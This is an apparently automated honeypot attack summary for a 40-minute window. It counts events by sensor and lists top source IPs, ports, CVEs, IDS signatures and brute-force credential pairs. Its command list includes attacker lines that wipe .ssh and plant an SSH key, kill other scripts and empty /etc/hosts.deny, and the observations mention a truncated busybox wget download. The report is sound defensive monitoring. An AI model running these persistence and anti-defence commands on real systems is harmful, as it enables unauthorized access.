**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-12T01:01:28Z
**Timeframe:** 2025-10-12T00:20:01Z - 2025-10-12T01:00:01Z
**Files Used:**
- agg_log_20251012T002001Z.json
- agg_log_20251012T004001Z.json
- agg_log_20251012T010001Z.json

**Executive Summary**
This report summarizes 18,962 malicious events recorded by the T-Pot honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force attempts. The most prolific attacker IP was 185.144.27.63, responsible for a significant portion of the total attack volume. A variety of CVEs were targeted, with a focus on older vulnerabilities. Attackers attempted numerous commands, primarily aimed at reconnaissance and establishing persistent access.

**Detailed Analysis**

**Attacks by Honeypot:**
- Cowrie: 11,352
- Honeytrap: 2,882
- Ciscoasa: 1,870
- Suricata: 1,544
- Dionaea: 849
- Sentrypeer: 141
- Mailoney: 138
- ConPot: 23
- Tanner: 41
- Redishoneypot: 27
- H0neytr4p: 41
- Honeyaml: 26
- ElasticPot: 3
- Adbhoney: 11
- Ipphoney: 1
- Miniprint: 13

**Top Attacking IPs:**
- 185.144.27.63: 5947
- 223.100.22.69: 771
- 72.56.64.34: 286
- 189.167.43.219: 267
- 193.32.162.157: 290
- 77.110.107.92: 283
- 78.94.76.242: 246
- 9.223.176.221: 260
- 185.76.34.16: 258
- 103.250.11.235: 202

**Top Targeted Ports/Protocols:**
- 22: 1989
- 445: 784
- 5903: 171
- 1250: 119
- 5060: 141
- 25: 140
- 8333: 98
- 80: 55
- TCP/22: 67
- TCP/80: 44

**Most Common CVEs:**
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2018-2893 CVE-2018-2893 CVE-2018-2893
- CVE-1999-0183
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773
- CVE-2005-4050
- CVE-2022-27255 CVE-2022-27255
- CVE-2021-42013 CVE-2021-42013

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- uname -a
- whoami
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN Potential SSH Scan
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 46
- ET CINS Active Threat Intelligence Poor Reputation IP group 45
- ET INFO CURL User Agent
- ET CINS Active Threat Intelligence Poor Reputation IP group 49
- ET HUNTING RDP Authentication Bypass Attempt

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- default/4444444444
- sa/1q2w3e4r!
- ubnt/P@ssword
- user/1234567
- root/sistek2015elas
- sipv/sipv123
- root/root6
- unknown/passwd
- root/3245gs5662d34

**Files Uploaded/Downloaded:**
- sh
- wget.sh;
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- ?format=json
- w.sh;
- c.sh;

**HTTP User-Agents:**
- No data available in the provided logs.

**SSH Clients:**
- No data available in the provided logs.

**SSH Servers:**
- No data available in the provided logs.

**Top Attacker AS Organizations:**
- No data available in the provided logs.

**Key Observations and Anomalies**
- A significant number of commands are focused on manipulating SSH authorized_keys to maintain persistence.
- The command `cd /data/local/tmp/; busybox wget ...` suggests attempts to compromise Android-based devices (due to the `/data/local/tmp/` path).
- The attackers are using a combination of scanning, brute-force, and exploitation of known vulnerabilities.
- The presence of commands to remove security scripts (`secure.sh`, `auth.sh`) indicates an awareness of other malware or security measures on the compromised systems.
- A wide range of usernames and passwords were attempted, from default credentials to more complex ones, suggesting the use of large dictionaries for brute-force attacks.
